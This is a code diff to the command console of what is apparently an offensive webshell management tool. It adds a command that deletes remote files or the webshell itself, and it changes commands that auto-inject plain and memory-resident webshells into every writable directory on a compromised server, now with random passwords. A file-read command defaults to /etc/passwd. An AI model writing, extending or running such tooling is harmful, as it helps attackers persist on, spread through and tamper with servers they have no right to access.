@@ -109,6 +109,16 @@ class Repl(cmd2.Cmd):
         path = str(line).strip() or self._ask("File path", "/etc/passwd")
         self._each(lambda ws: files.read_file(ws, path), "read")
 
+    def do_rm(self, line: cmd2.Statement) -> None:
+        """rm [path] — delete a remote file; with no path the shell deletes itself."""
+        path = str(line).strip() or None
+        if path is None:
+            confirm = input("Delete the webshell ITSELF (you lose access)? [y/N]: ")
+            if confirm.strip().lower() != "y":
+                log.info("Aborted.")
+                return
+        self._each(lambda ws: files.remove(ws, path), "remove")
+
     # -- transfers -------------------------------------------------------------
     def do_dl(self, line: cmd2.Statement) -> None:
         """dl <path> — download a remote file or directory tree."""
@@ -201,8 +211,8 @@ class Repl(cmd2.Cmd):
 
     # -- injection -------------------------------------------------------------
     def do_aiw(self, _: cmd2.Statement) -> None:
-        """Auto-inject a plain webshell into every writable directory."""
-        password = self._ask("New password", "s3cr3t")
+        """Auto-inject a plain webshell (blank password = random per directory)."""
+        password = input("New password (blank = random per directory): ").strip() or None
         self._each(
             lambda ws: inject.inject_webshell(
                 ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
@@ -211,8 +221,8 @@ class Repl(cmd2.Cmd):
         )
 
     def do_aimw(self, _: cmd2.Statement) -> None:
-        """Auto-inject a memory-resident (self-healing) webshell."""
-        password = self._ask("New password", "s3cr3t")
+        """Auto-inject a memory-resident webshell (blank password = random)."""
+        password = input("New password (blank = random per directory): ").strip() or None
         self._each(
             lambda ws: inject.inject_memory_webshell(
                 ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
